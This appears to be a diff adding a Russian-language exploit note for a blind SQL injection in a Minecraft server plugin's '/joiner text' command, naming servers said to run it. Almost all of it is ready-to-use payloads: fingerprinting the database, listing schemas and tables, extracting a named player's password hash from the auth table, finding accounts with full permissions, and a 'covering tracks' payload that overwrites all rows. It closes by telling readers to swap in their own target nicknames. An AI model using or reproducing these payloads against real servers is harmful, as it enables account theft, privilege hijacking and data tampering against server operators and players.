@@ -1,0 +1,31 @@
+Плагин стоит/стоял на всех серверах хакера333, и на SpotyMC
+Плагин имеет слепую SQL-инъекцию
+Для эксплотации требуется право на /joiner text
+
+Примеры:
+
+Узнаем ОС:
+/joiner text ',text=concat(@@version,char(32),@@version_compile_os) where name='r_ASW';--
+Узнаем юзера:
+/joiner text ',text=user() where name='r_ASW';--
+Узнаем путь:
+/joiner text ',text=@@datadir where name='r_ASW';--
+ЗАМЕТАЕМ СЛЕДЫ:
+/joiner text ',text=' зашёл на сервер!' where 1=1;--
+Вывести доступные бд:
+/joiner text ',text=(select group_concat(schema_name) from information_schema.schemata) where name='r_ASW';--
+
+Узнаем список таблиц в бд (grief)
+/joiner text ',text=(select table_name from information_schema.tables where table_schema='grief' limit 0,1) where name='r_ASW';--
+
+Извлекаем хеш
+/joiner text ',text=(select mid(password_hash,1,30) from mc_auth_accounts where player_name='haker333_yt_') where name='r_ASW';--
+/joiner text ',text=(select mid(password_hash,31,100) from mc_auth_accounts where player_name='haker333_yt_') where name='r_ASW';--
+
+Ищем *
+/joiner text ',text=(select username from luckperms_players where uuid=(select uuid from luckperms_user_permissions where permission=0x2a limit 0,1));--
+
+Узнаем список всех групп
+/joiner text ',text=(select mid(group_concat(name),1,30) from luckperms_groups) where name='r_ASW';--
+
+В данных пейлоадах подменяем ники под наши нужды
